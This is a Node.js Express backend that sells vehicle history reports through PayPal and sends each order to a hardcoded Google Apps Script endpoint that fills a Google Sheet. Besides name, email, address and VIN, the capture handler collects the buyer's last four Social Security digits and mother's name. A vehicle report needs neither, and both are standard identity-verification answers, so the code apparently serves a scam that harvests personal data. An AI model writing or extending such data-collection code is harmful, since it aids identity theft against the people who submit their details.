const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const paypal = require('@paypal/checkout-server-sdk');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Configure PayPal environment
const Environment = process.env.NODE_ENV === 'production'
    ? paypal.core.LiveEnvironment
    : paypal.core.SandboxEnvironment;

const paypalClient = new paypal.core.PayPalHttpClient(
    new Environment(
    process.env.PAYPAL_CLIENT_ID,
    process.env.PAYPAL_CLIENT_SECRET
)

);

// Google Sheets integration
async function saveToGoogleSheet(data) {
    try {
        const sheetData = {
            order_id: data.order_id || 'N/A',
            timestamp: new Date().toLocaleString(),
            customer_name: data.customer_name,
            customer_email: data.customer_email,
            vin_number: data.vin_number,
            selected_plan: data.selected_plan,
            full_address: data.full_address,
            payment_method: data.payment_method || 'PayPal',
            payment_id: data.payment_id || 'N/A',
            payer_email: data.payer_email || 'N/A',
            ssn_last4: data.ssn_last4 || "Not provided",
            mothers_name: data.mothers_name || "Not provided"
        };

        const response = await axios.post(
            'https://script.google.com/macros/s/AKfycbw5DcW435YpDDtlKkv2UPDx9relOun4U3H-c0DbY6FwUrn2BH7z4kX8CmbNRFb-uvYsqw/exec',
            sheetData,
            { headers: { 'Content-Type': 'application/json' } }
        );

        console.log('Saved to Google Sheets:', response.data);
        return true;
    } catch (error) {
        console.error('Google Sheets error:', error);
        return false;
    }
}

// Create PayPal Order
app.post('/create-paypal-order', async (req, res) => {
    try {
        const { amount, vin, plan, currency = 'USD' } = req.body;

        if (!amount || !vin || !plan) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const request = new paypal.orders.OrdersCreateRequest();
        request.prefer("return=representation");
        request.requestBody({
            intent: 'CAPTURE',
            purchase_units: [{
                amount: {
                    currency_code: currency,
                    value: amount.toString(),
                    breakdown: {
                        item_total: {
                            currency_code: currency,
                            value: amount.toString()
                        }
                    }
                },
                items: [{
                    name: `${plan} Vehicle Report`,
                    description: `VIN: ${vin}`,
                    unit_amount: {
                        currency_code: currency,
                        value: amount.toString()
                    },
                    quantity: '1',
                    category: 'DIGITAL_GOODS'
                }],
                custom_id: vin,
                description: `Vehicle History Report - ${plan}`
            }],
            application_context: {
                shipping_preference: 'NO_SHIPPING',
                user_action: 'PAY_NOW',
                return_url: 'https://yourdomain.com/success',
                cancel_url: 'https://yourdomain.com/cancel'
            }
        });

        const order = await paypalClient.execute(request);
        
        console.log('Created PayPal order:', order.result.id);
        res.json({ 
            id: order.result.id,
            status: order.result.status 
        });

    } catch (err) {
        console.error('PayPal create order error:', err);
        res.status(500).json({ 
            error: 'Failed to create PayPal order',
            details: err.message 
        });
    }
});

// Capture PayPal Order
app.post('/capture-paypal-order', async (req, res) => {
    try {
        const { orderID, vin, plan } = req.body;

        if (!orderID) {
            return res.status(400).json({ error: 'Order ID is required' });
        }

        const request = new paypal.orders.OrdersCaptureRequest(orderID);
        request.requestBody({});

        const capture = await paypalClient.execute(request);
        const captureId = capture.result.purchase_units[0].payments.captures[0].id;
        const payerEmail = capture.result.payer.email_address;
        
        // Prepare data for Google Sheets
        const customerData = {
           order_id: orderID,   // ✅ correct
            customer_name: req.body.name || 'Not provided',
            customer_email: req.body.email || payerEmail,
            vin_number: vin,
            selected_plan: plan,
            full_address: req.body.address || 'Not provided',
            payment_method: 'PayPal',
            payment_id: captureId,
            payer_email: payerEmail,
            ssn_last4: req.body.ssnLast4 || 'Not provided',
            mothers_name: req.body.mothersName || 'Not provided'
        };

        // Save to Google Sheets
        await saveToGoogleSheet(customerData);

        res.json({ 
            status: 'COMPLETED',
            id: captureId,
            payer_email: payerEmail
        });

    } catch (err) {
        console.error('PayPal capture error:', err);
        res.status(500).json({ 
            error: 'Failed to capture payment',
            details: err.message 
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date() });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`PayPal environment: ${process.env.NODE_ENV || 'sandbox'}`);
});